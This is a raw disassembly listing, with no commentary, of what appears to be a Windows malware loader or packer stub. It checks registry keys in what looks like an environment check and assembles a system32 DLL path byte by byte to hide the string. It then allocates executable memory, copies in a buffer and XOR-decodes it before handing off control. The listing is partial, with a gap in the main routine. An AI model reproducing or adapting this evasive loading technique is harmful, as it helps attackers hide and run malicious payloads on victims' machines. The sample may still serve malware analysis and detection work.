0x00401000:	pushl	%ebp	; from: 0x004013c5(MAY)
0x00401001:	movl	%esp, %ebp
0x00401003:	movl	$0x40520d, 0x00402248
0x0040100d:	popl	%ebp
0x0040100e:	ret	; targets: 0x004013ca(MAY)

0x00401020:	pushl	%ebp	; from: 0x004013d1(MAY)
0x00401021:	movl	%esp, %ebp
0x00401023:	movl	0x8(%ebp), %eax
0x00401026:	movl	-4(%eax), %eax
0x00401029:	popl	%ebp
0x0040102a:	ret	; targets: 0x004013d6(MAY)

0x00401100:	pushl	%ebp	; from: 0x004013e6(MAY)
0x00401101:	movl	%esp, %ebp
0x00401103:	pushl	%ecx
0x00401104:	movl	$0x4, -4(%ebp)
0x0040110b:	pushl	$0x40
0x0040110d:	pushl	$0x3000
0x00401112:	movl	0x8(%ebp), %eax
0x00401115:	pushl	%eax
0x00401116:	pushl	$0x0
0x00401118:	call	VirtualAlloc@kernel32.dll	; targets: 0xff000050(MAY)
0x0040111e:	movl	%ebp, %esp
0x00401120:	popl	%ebp
0x00401121:	ret	; targets: 0x004013eb(MAY)

0x00401130:	pushl	%ebp	; from: 0x00401404(MAY)
0x00401131:	movl	%esp, %ebp
0x00401133:	popl	%ebp
0x00401134:	ret	; targets: 0x00401409(MAY)

0x00401140:	pushl	%ebp	; from: 0x00401438(MAY)
0x00401141:	movl	%esp, %ebp
0x00401143:	subl	$0x8, %esp
0x00401146:	movl	0x8(%ebp), %eax
0x00401149:	movl	%eax, -4(%ebp)
0x0040114c:	movl	0xc(%ebp), %ecx
0x0040114f:	movl	%ecx, -8(%ebp)
0x00401152:	movl	-4(%ebp), %edx
0x00401155:	cmpl	-8(%ebp), %edx
0x00401158:	jae	0x00401161	; targets: 0x0040115a(MAY), 0x00401161(MAY)
0x0040115a:	movl	-4(%ebp), %eax	; from: 0x00401158(MAY)
0x0040115d:	jmp	0x00401164	; targets: 0x00401164(MAY)
0x00401161:	movl	-8(%ebp), %eax	; from: 0x00401158(MAY)
0x00401164:	movl	%ebp, %esp	; from: 0x0040115d(MAY)
0x00401166:	popl	%ebp
0x00401167:	ret	; targets: 0x0040143d(MAY)

0x00401170:	pushl	%ebp	; from: 0x004014be(MAY)
0x00401171:	movl	%esp, %ebp
0x00401173:	subl	$0x18, %esp
0x00401176:	movl	$0x37, -4(%ebp)
0x0040117d:	movl	$0x0, -12(%ebp)
0x00401184:	jmp	0x0040118f	; targets: 0x0040118f(MAY)
0x00401186:	movl	-12(%ebp), %eax	; from: 0x004011f6(MAY)
0x00401189:	addl	$0x4, %eax
0x0040118c:	movl	%eax, -12(%ebp)
0x0040118f:	movl	-12(%ebp), %ecx	; from: 0x00401184(MAY)
0x00401192:	cmpl	0xc(%ebp), %ecx
0x00401195:	jae	0x004011f8	; targets: 0x00401197(MAY), 0x004011f8(MAY)
0x00401197:	movl	$0x1425, -4(%ebp)	; from: 0x00401195(MAY)
0x0040119e:	movl	$0x37, -4(%ebp)
0x004011a5:	movl	-12(%ebp), %edx
0x004011a8:	addl	$0x12e270, %edx
0x004011ae:	movl	%edx, 0x0040224c
0x004011b4:	movl	0x8(%ebp), %eax
0x004011b7:	addl	-12(%ebp), %eax
0x004011ba:	movl	(%eax), %ecx
0x004011bc:	addl	-12(%ebp), %ecx
0x004011bf:	movl	0x8(%ebp), %edx
0x004011c2:	addl	-12(%ebp), %edx
0x004011c5:	movl	%ecx, (%edx)
0x004011c7:	movl	-8(%ebp), %eax
0x004011ca:	movl	%eax, -16(%ebp)
0x004011cd:	movl	$0x1425, -4(%ebp)
0x004011d4:	movl	0x0040224c, %ecx
0x004011da:	movl	%ecx, -24(%ebp)
0x004011dd:	movl	-24(%ebp), %edx
0x004011e0:	movl	%edx, -20(%ebp)
0x004011e3:	movl	0x8(%ebp), %eax
0x004011e6:	addl	-12(%ebp), %eax
0x004011e9:	movl	(%eax), %ecx
0x004011eb:	xorl	-20(%ebp), %ecx
0x004011ee:	movl	0x8(%ebp), %edx
0x004011f1:	addl	-12(%ebp), %edx
0x004011f4:	movl	%ecx, (%edx)
0x004011f6:	jmp	0x00401186	; targets: 0x00401186(MAY)
0x004011f8:	movl	%ebp, %esp	; from: 0x00401195(MAY)
0x004011fa:	popl	%ebp
0x004011fb:	ret	; targets: unresolved


start:
0x00401200:	pushl	%ebp
0x00401201:	movl	%esp, %ebp
0x00401203:	subl	$0x16c, %esp
0x00401209:	pusha	
0x0040120a:	movl	%ebp, 0x00402250
0x00401210:	movl	$0x0, -324(%ebp)
0x0040121a:	movl	CreateFileA@kernel32.dll, %eax
0x0040121f:	movl	%eax, -344(%ebp)
0x00401225:	movl	$0x0, -276(%ebp)
0x0040122f:	movl	$0x64, -316(%ebp)
0x00401239:	movl	$0x1, -284(%ebp)
0x00401243:	movl	$0x0, -324(%ebp)
0x0040124d:	movl	$0x0, -292(%ebp)
0x00401257:	movl	$0x1, -312(%ebp)
0x00401261:	movl	$0x3, -280(%ebp)
0x0040126b:	movl	$0x0, -276(%ebp)
0x00401275:	movl	$0x64, -316(%ebp)
0x0040127f:	movl	$0x1, -284(%ebp)
0x00401289:	movl	$0x0, -324(%ebp)
0x00401293:	movl	$0x0, -292(%ebp)
0x0040129d:	movl	$0x1, -312(%ebp)
0x004012a7:	movl	$0x3, -280(%ebp)
0x004012b1:	pushl	$0x104
0x004012b6:	leal	-272(%ebp), %ecx
0x004012bc:	pushl	%ecx
0x004012bd:	call	GetWindowsDirectoryA@kernel32.dll	; targets: 0xff000010(MAY)
0x004012c3:	call	0x00401680	; targets: 0x00401680(MAY)
0x004012c8:	leal	-296(%ebp), %edx	; from: 0x00401727(MAY)
0x004012ce:	pushl	%edx
0x004012cf:	pushl	$0x20019
0x004012d4:	pushl	$0x0
0x004012d6:	pushl	$0x40206c
0x004012db:	pushl	$0x80000002
0x004012e0:	call	RegOpenKeyExW@advapi32.dll	; targets: 0xff000030(MAY)
0x004012e6:	testl	%eax, %eax
0x004012e8:	je	0x004012f9	; targets: 0x004012ea(MAY), 0x004012f9(MAY)
0x004012ea:	pushl	$0x4	; from: 0x004012e8(MAY)
0x004012ec:	call	LoadLibraryW@kernel32.dll	; targets: 0xff000020(MAY)
0x004012f2:	xorl	%eax, %eax
0x004012f4:	jmp	0x00401677	; targets: 0x00401677(MAY)
0x004012f9:	leal	-296(%ebp), %eax	; from: 0x004012e8(MAY)
0x004012ff:	pushl	%eax
0x00401300:	pushl	$0x20019
0x00401305:	pushl	$0x0
0x00401307:	pushl	$0x402080
0x0040130c:	movl	-296(%ebp), %ecx
0x00401312:	pushl	%ecx
0x00401313:	call	RegOpenKeyExW@advapi32.dll	; targets: 0xff000030(MAY)
0x00401319:	testl	%eax, %eax
0x0040131b:	je	0x0040132c	; targets: 0x0040132c(MAY), 0x0040131d(MAY)
0x0040131d:	pushl	$0x4	; from: 0x0040131b(MAY)
0x0040131f:	call	LoadLibraryW@kernel32.dll	; targets: 0xff000020(MAY)
0x00401325:	xorl	%eax, %eax
0x00401327:	jmp	0x00401677	; targets: 0x00401677(MAY)
0x0040132c:	leal	-296(%ebp), %edx	; from: 0x0040131b(MAY)
0x00401332:	pushl	%edx
0x00401333:	pushl	$0x20019
0x00401338:	pushl	$0x0
0x0040133a:	pushl	$0x402090
0x0040133f:	movl	-296(%ebp), %eax
0x00401345:	pushl	%eax
0x00401346:	call	RegOpenKeyExW@advapi32.dll	; targets: 0xff000030(MAY)
0x0040134c:	testl	%eax, %eax
0x0040134e:	je	0x0040135f	; targets: 0x00401350(MAY), 0x0040135f(MAY)
0x00401350:	pushl	$0x4	; from: 0x0040134e(MAY)
0x00401352:	call	LoadLibraryW@kernel32.dll	; targets: 0xff000020(MAY)
0x00401358:	xorl	%eax, %eax
0x0040135a:	jmp	0x00401677	; targets: 0x00401677(MAY)
0x0040135f:	leal	-296(%ebp), %ecx	; from: 0x0040134e(MAY)
0x00401365:	pushl	%ecx
0x00401366:	pushl	$0x20019
0x0040136b:	pushl	$0x0
0x0040136d:	pushl	$0x4020b0
0x00401372:	movl	-296(%ebp), %edx
0x00401378:	pushl	%edx
0x00401379:	call	RegOpenKeyExW@advapi32.dll	; targets: 0xff000030(MAY)
0x0040137f:	testl	%eax, %eax
0x00401381:	je	0x00401392	; targets: 0x00401383(MAY), 0x00401392(MAY)
0x00401383:	pushl	$0x4	; from: 0x00401381(MAY)
0x00401385:	call	LoadLibraryW@kernel32.dll	; targets: 0xff000020(MAY)
0x0040138b:	xorl	%eax, %eax
0x0040138d:	jmp	0x00401677	; targets: 0x00401677(MAY)
0x00401392:	leal	-296(%ebp), %eax	; from: 0x00401381(MAY)
0x00401398:	pushl	%eax
0x00401399:	pushl	$0x20019
0x0040139e:	pushl	$0x0
0x004013a0:	pushl	$0x40209c
0x004013a5:	movl	-296(%ebp), %ecx
0x004013ab:	pushl	%ecx
0x004013ac:	call	RegOpenKeyExW@advapi32.dll	; targets: 0xff000030(MAY)
0x004013b2:	testl	%eax, %eax
0x004013b4:	jne	0x004013c5	; targets: 0x004013c5(MAY), 0x004013b6(MAY)
0x004013b6:	pushl	$0x4	; from: 0x004013b4(MAY)
0x004013b8:	call	LoadLibraryW@kernel32.dll	; targets: 0xff000020(MAY)
0x004013be:	xorl	%eax, %eax
0x004013c0:	jmp	0x00401677	; targets: 0x00401677(MAY)
0x004013c5:	call	0x00401000	; targets: 0x00401000(MAY)	; from: 0x004013b4(MAY)
0x004013ca:	movl	0x00402248, %edx	; from: 0x0040100e(MAY)
0x004013d0:	pushl	%edx
0x004013d1:	call	0x00401020	; targets: 0x00401020(MAY)
0x004013d6:	addl	$0x4, %esp	; from: 0x0040102a(MAY)
0x004013d9:	movl	%eax, -328(%ebp)
0x004013df:	movl	-328(%ebp), %eax
0x004013e5:	pushl	%eax
0x004013e6:	call	0x00401100	; targets: 0x00401100(MAY)
0x004013eb:	addl	$0x4, %esp	; from: 0x00401121(MAY)
0x004013ee:	movl	%eax, -320(%ebp)
0x004013f4:	movl	-328(%ebp), %ecx
0x004013fa:	pushl	%ecx
0x004013fb:	pushl	$0x0
0x004013fd:	movl	-320(%ebp), %edx
0x00401403:	pushl	%edx
0x00401404:	call	0x00401130	; targets: 0x00401130(MAY)
0x00401409:	addl	$0xc, %esp	; from: 0x00401134(MAY)
0x0040140c:	movl	-328(%ebp), %eax
0x00401412:	movl	%eax, -336(%ebp)
0x00401418:	movl	-324(%ebp), %ecx	; from: 0x004014ab(MAY)
0x0040141e:	cmpl	-328(%ebp), %ecx
0x00401424:	jae	0x004014b0	; targets: 0x0040142a(MAY), 0x004014b0(MAY)
0x0040142a:	movl	-336(%ebp), %edx	; from: 0x00401424(MAY)
0x00401430:	pushl	%edx
0x00401431:	movl	-316(%ebp), %eax
0x00401437:	pushl	%eax
0x00401438:	call	0x00401140	; targets: 0x00401140(MAY)
0x0040143d:	addl	$0x8, %esp	; from: 0x00401167(MAY)
0x00401440:	movl	%eax, -340(%ebp)
0x00401446:	movl	-340(%ebp), %ecx
0x0040144c:	pushl	%ecx
0x0040144d:	movl	0x00402248, %edx
0x00401453:	addl	-292(%ebp), %edx
0x00401459:	pushl	%edx
0x0040145a:	movl	-320(%ebp), %eax
0x00401460:	addl	-324(%ebp), %eax
0x00401466:	pushl	%eax
0x00401467:	call	0x00401740	; targets: 0x00401740(MAY)
0x0040146c:	addl	$0xc, %esp
0x0040146f:	movl	-284(%ebp), %ecx
0x00401475:	addl	-316(%ebp), %ecx
0x0040147b:	addl	-292(%ebp), %ecx
0x00401481:	movl	%ecx, -292(%ebp)
0x00401487:	movl	-324(%ebp), %edx
0x0040148d:	addl	-316(%ebp), %edx
0x00401493:	movl	%edx, -324(%ebp)
0x00401499:	movl	-336(%ebp), %eax
0x0040149f:	subl	-340(%ebp), %eax
0x004014a5:	movl	%eax, -336(%ebp)
0x004014ab:	jmp	0x00401418	; targets: 0x00401418(MAY)
0x004014b0:	movl	-328(%ebp), %ecx	; from: 0x00401424(MAY)
0x004014b6:	pushl	%ecx
0x004014b7:	movl	-320(%ebp), %edx
0x004014bd:	pushl	%edx
0x004014be:	call	0x00401170	; targets: 0x00401170(MAY)
0x00401677:	movl	%ebp, %esp	; from: 0x00401327(MAY), 0x0040135a(MAY), 0x004012f4(MAY), 0x004013c0(MAY), 0x0040138d(MAY)
0x00401679:	popl	%ebp
0x0040167a:	ret	; targets: 0xfee70000(MAY)

0x00401680:	pushl	%ebp	; from: 0x004012c3(MAY)
0x00401681:	movl	%esp, %ebp
0x00401683:	movl	0x00402014, %eax
0x00401688:	movb	$0x73, 0x3(%eax)
0x0040168c:	movl	0x00402014, %ecx
0x00401692:	movb	$0x74, 0x4(%ecx)
0x00401696:	movl	0x00402014, %edx
0x0040169c:	movb	$0x65, 0x5(%edx)
0x004016a0:	movl	0x00402014, %eax
0x004016a5:	movb	$0x6d, 0x6(%eax)
0x004016a9:	movl	0x00402014, %ecx
0x004016af:	movb	$0x33, 0x7(%ecx)
0x004016b3:	movl	0x00402014, %edx
0x004016b9:	movb	$0x32, 0x8(%edx)
0x004016bd:	movl	0x00402014, %eax
0x004016c2:	movb	$0x5c, 0x9(%eax)
0x004016c6:	movl	0x00402014, %ecx
0x004016cc:	movb	$0x61, 0xa(%ecx)
0x004016d0:	movl	0x00402014, %edx
0x004016d6:	movb	$0x74, 0xb(%edx)
0x004016da:	movl	0x00402014, %eax
0x004016df:	movb	$0x6c, 0xc(%eax)
0x004016e3:	movl	0x00402014, %ecx
0x004016e9:	movb	$0x2e, 0xd(%ecx)
0x004016ed:	movl	0x00402014, %edx
0x004016f3:	movb	$0x64, 0xe(%edx)
0x004016f7:	movl	0x00402014, %eax
0x004016fc:	movb	$0x6c, 0xf(%eax)
0x00401700:	movl	0x00402014, %ecx
0x00401706:	movb	$0x6c, 0x10(%ecx)
0x0040170a:	movl	0x00402014, %edx
0x00401710:	movb	$0x5c, (%edx)
0x00401713:	movl	0x00402014, %eax
0x00401718:	movb	$0x73, 0x1(%eax)
0x0040171c:	movl	0x00402014, %ecx
0x00401722:	movb	$0x79, 0x2(%ecx)
0x00401726:	popl	%ebp
0x00401727:	ret	; targets: 0x004012c8(MAY)

0x00401740:	jmp	memcpy@msvcrt.dll	; targets: 0xff000060(MAY)	; from: 0x00401467(MAY)